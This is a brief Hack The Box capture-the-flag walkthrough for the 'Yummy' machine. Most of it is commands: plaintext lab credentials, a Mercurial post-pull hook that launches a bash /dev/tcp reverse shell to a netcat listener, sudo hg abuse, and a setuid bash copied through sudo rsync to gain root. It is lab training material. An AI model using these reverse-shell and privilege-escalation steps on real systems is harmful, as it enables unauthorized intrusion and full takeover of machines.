

## Yummy

User for HTB Yummy  
DB CREDS  
/var/www/app-qatesting/.hg/store/data/app.py.i  
username : chef  
password  : 3wDo7gSRZIwIHRxZ!  
ssh qa@yummy.htb  
SSH USER --  
username : qa  
password  : jPAd!XQCtn8Oc@2B  
--------------  
cd /tmp; mkdir .hg; chmod 777 .hg; cp ~/.hgrc .hg/hgrc  
Add the reverse shell script at the last line in /tmp/.hg/hgrc:  
Put this line inside the /tmp/.hg/hgrc file using nano   
[hooks]  
post-pull = /tmp/revshell.sh  
Then Create a file revshell.sh inside the /tmp folder  
nano revshell.sh  
#!/bin/bash  
/bin/bash -i >/dev/tcp/10.10.x.x./4444 0<&1 2>&1  
Then give execute permissions --  
chmod +x /tmp/revshell.sh  
Don't forget to start the Netcat listener on port 4444  
nc -lvnp 4444  
go back to the ssh shell --  
sudo -u dev /usr/bin/hg pull /home/dev/app-production/  
enter the password for the user qa  
This will give you a reverse shell on port 4444  
inside the shell ( 4444 )  
cd /home/dev/  
cp /bin/bash app-production/bash  
chmod u+s app-production/bash  
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/  
/opt/app/bash -p  
You now have root access.  
whoami or id  
cd /root  
cat root.txt  
Thank you !
